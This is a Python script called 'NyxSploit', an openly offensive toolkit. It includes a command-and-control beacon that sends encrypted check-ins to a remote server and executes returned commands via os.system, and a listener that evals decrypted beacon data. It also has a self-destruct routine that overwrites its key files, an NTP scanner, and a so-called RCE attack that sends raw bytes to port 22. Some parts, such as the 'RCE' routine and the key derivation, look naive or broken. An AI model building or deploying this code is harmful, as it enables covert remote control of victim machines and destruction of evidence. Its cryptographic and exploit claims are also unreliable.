#!/usr/bin/env python3

import sys, os, time, socket, argparse, base64, subprocess, sqlite3
from hashlib import sha256
from cryptography.hazmat.primitives import padding as _pad
from cryptography.hazmat.primitives.ciphers import Cipher as _Cipher, algorithms as _alg, modes as _modes
from cryptography.hazmat.backends import default_backend

def _check_and_install():
    missing = []
    try:
        import ntplib  # noqa: F401
    except ImportError:
        missing.append('ntplib')
    try:
        from cryptography.hazmat.primitives import padding  # noqa: F401
    except ImportError:
        missing.append('cryptography')
    if not missing:
        return
    system = sys.platform
    if system.startswith("win"):
        for pkg in missing:
            subprocess.call(f"pip install {pkg}", shell=True)
    elif system.startswith("linux"):
        distro = ""
        try:
            with open("/etc/os-release") as f:
                for line in f:
                    if line.startswith("ID="):
                        distro = line.split("=")[1].strip().strip('"').lower()
                        break
        except:
            pass
        if distro in ("arch", "manjaro", "endeavouros"):
            subprocess.call("sudo pacman -Sy --noconfirm python-pip", shell=True)
            for pkg in missing:
                subprocess.call(f"pip3 install {pkg}", shell=True)
        elif distro in ("ubuntu", "debian", "linuxmint") or "ubuntu" in distro:
            subprocess.call("sudo apt-get update -y", shell=True)
            subprocess.call("sudo apt-get install -y python3-pip", shell=True)
            for pkg in missing:
                subprocess.call(f"pip3 install {pkg}", shell=True)
        else:
            for pkg in missing:
                subprocess.call(f"pip3 install {pkg}", shell=True)
    else:
        for pkg in missing:
            subprocess.call(f"pip3 install {pkg}", shell=True)

_check_and_install()

import ntplib
import sqlite3

def _typeout(text):
    for c in text:
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0.05)
    print()

def _Khaos(pool, timeout):
    servers = pool.split(',')
    graveyards = []
    for s in servers:
        try:
            client = ntplib.NTPClient()
            resp = client.request(s, timeout=timeout, version=3)
            if hasattr(resp, 'tx_time'):
                graveyards.append(s)
        except:
            pass
    banner = "━━ Verified NTP Graveyards ━━"
    print(f"\n{banner}\n  {', '.join(graveyards)}\n{'━' * len(banner)}")

def _derive(password, salt, iterations=100000):
    return sha256(password.encode() + salt).digest()

def _encrypt(message, key):
    iv = os.urandom(16)
    padder = _pad.PKCS7(128).padder()
    padded = padder.update(message.encode()) + padder.finalize()
    encryptor = _Cipher(_alg.AES(key), _modes.CFB(iv), backend=default_backend()).encryptor()
    ciphertext = encryptor.update(padded) + encryptor.finalize()
    return base64.b64encode(iv + ciphertext).decode()

def _decrypt(b64data, key):
    raw = base64.b64decode(b64data)
    iv, ct = raw[:16], raw[16:]
    decryptor = _Cipher(_alg.AES(key), _modes.CFB(iv), backend=default_backend()).decryptor()
    padded = decryptor.update(ct) + decryptor.finalize()
    unpadder = _pad.PKCS7(128).unpadder()
    return unpadder.update(padded) + unpadder.finalize()

def _Thanatos(cfg):
    print(r"""
         .-''''-.
        /  .--.  \
       /  /    \  \
       |  |    |  |
       \  \    /  /
        '.'--'.'
      • Thanatos awakens •
    """.strip())
    key = open(cfg['keyfile'], 'rb').read()
    mid, srv, port = cfg['mid'], cfg['srv'], cfg['port']
    interval = cfg['intv']
    os_name = cfg.get('os') or os.uname().sysname
    while True:
        data_dict = {'mid': mid, 'os': os_name, 'timestamp': int(time.time()), 'raw_payload': None}
        payload = repr(data_dict)
        enc = _encrypt(payload, key)
        try:
            sck = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sck.settimeout(3)
            sck.sendto(enc.encode(), (srv, port))
            resp, _ = sck.recvfrom(2048)
            if resp:
                _Lethe(resp.decode(), key)
        except:
            pass
        time.sleep(interval)

def _Aletheia(target, command):
    password, salt = "s3cr3t", b"salty__"
    key = _derive(password, salt)
    enc = _encrypt(command, key)
    with open(f"{target}.enc", 'w') as f:
        f.write(enc)
    banner = f"━━ Encrypted Command for {target} ━━"
    print(f"\n{banner}\n  {enc}\n{'━' * len(banner)}")

def _Lethe(b64data, key=None):
    if not key:
        try:
            key = open('/etc/thanatos.key', 'rb').read()
        except:
            return
    try:
        cmd = _decrypt(b64data, key).decode()
        print(f"[Lethe] Executing: {cmd}")
        os.system(cmd)
    except:
        pass

def _Erebus():
    banner = "━━ Erebus Invoked: Cleansing Vessel ━━"
    print(f"\n{banner}")
    for path in ['/etc/thanatos.conf', '/etc/thanatos.key']:
        try:
            size = os.path.getsize(path)
            with open(path, 'wb') as fp:
                fp.write(os.urandom(size))
            os.remove(path)
        except:
            pass
    print("  All memory erased. Vessel cleansed.\n" + "━" * len(banner))

def _Eidolon(db_path, listen_port):
    print(r"""
        ______  _   _   ____
       |  ____|| \ | | / __ \
       | |__   |  \| || |  | |
       |  __|  | . ` || |  | |
       | |____ | |\  || |__| |
       |______||_| \_| \____/
      • Eidolon listens in shadow •
    """.strip())
    conn = sqlite3.connect(db_path, check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute('''CREATE TABLE IF NOT EXISTS beacons
                      (id TEXT, ip TEXT, os TEXT, timestamp INTEGER, raw_payload BLOB)''')
    conn.commit()
    def record_beacon(d, addr):
        try:
            cursor.execute("INSERT INTO beacons VALUES (?, ?, ?, ?, ?)",
                           (d['mid'], addr[0], d['os'], d['timestamp'], d.get('raw_payload')))
            conn.commit()
            box_top = "╔" + "═" * 30 + "╗"
            box_mid = (f"║  ☾ Echo Received — ID: {d['mid']}".ljust(31) + "║")
            box_bot = "╚" + "═" * 30 + "╝"
            print(f"\n{box_top}\n{box_mid}\n{box_bot}\n")
        except:
            pass
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(('', listen_port))
    key = None
    try:
        key = open('/etc/eidolon.key', 'rb').read()
    except:
        pass
    while True:
        data, addr = sock.recvfrom(2048)
        try:
            if key:
                plain = _decrypt(data.decode(), key).decode()
                d = eval(plain)
                record_beacon(d, addr)
        except:
            pass

def _Typhon(target, command):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, 22))
        s.sendall(b''.join([
            b'\x00\x00\x00\x00',
            command.encode(),
            b'\x00'
        ]))
        s.close()
    except:
        pass

def _menu():
    audio_url = "https://files.catbox.moe/7dwrsq.mp3"
    subprocess.Popen(["mpv", audio_url], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    _typeout("Time never waits... It delivers all the same end.")
    time.sleep(3)

    while True:
        os.system('clear' if not sys.platform.startswith("win") else 'cls')
        print(r"""
    ╔════════════════════════════╗
    ║        NyxSploit Menu      ║
    ╠════════════════════════════╣
    ║  1) Khaos - Scan NTP Pools ║
    ║  2) Thanatos - Beacon C2   ║
    ║  3) Aletheia - Encrypt Cmd ║
    ║  4) Lethe - Decrypt/Exec   ║
    ║  5) Eidolon - Listen/Log   ║
    ║  6) Erebus - Self-Destruct ║
    ║  7) Typhon - RCE Attack    ║
    ║  8) Exit                   ║
    ╚════════════════════════════╝
        """)
        choice = input("Select an option > ").strip()
        if choice == '1':
            pool = input("Enter comma-separated NTP pool> ")
            timeout = input("Timeout (seconds)> ")
            try:
                t = int(timeout)
                _Khaos(pool, t)
            except:
                print("Invalid timeout.")
            input("\nPress Enter to continue...")
        elif choice == '2':
            cfg_path = input("Thanatos config path> ")
            try:
                with open(cfg_path, 'r') as f:
                    cfg = eval(f.read())
                cfg['os'] = os.uname().sysname
                _Thanatos(cfg)
            except:
                print("Could not load config.")
                input("\nPress Enter to continue...")
        elif choice == '3':
            target = input("Target ID> ")
            cmd = input("Command> ")
            _Aletheia(target, cmd)
            input("\nPress Enter to continue...")
        elif choice == '4':
            enc = input("Enter base64 payload> ")
            key_path = input("Thanatos key path (default /etc/thanatos.key)> ").strip()
            key = None
            if key_path:
                try:
                    key = open(key_path, 'rb').read()
                except:
                    print("Key not found, using default.")
            _Lethe(enc, key)
            input("\nPress Enter to continue...")
        elif choice == '5':
            db = input("SQLite DB path> ")
            port = input("Listen port> ")
            try:
                p = int(port)
                _Eidolon(db, p)
            except:
                print("Invalid port.")
                input("\nPress Enter to continue...")
        elif choice == '6':
            confirm = input("Confirm self-destruct (y/N)> ").strip().lower()
            if confirm == 'y':
                _Erebus()
            input("\nPress Enter to continue...")
        elif choice == '7':
            target = input("Target IP> ")
            command = input("Command to execute> ")
            _Typhon(target, command)
            input("\nPress Enter to continue...")
        elif choice == '8':
            print("Farewell.")
            break
        else:
            print("Invalid choice.")
            time.sleep(1)

if __name__ == "__main__":
    _menu()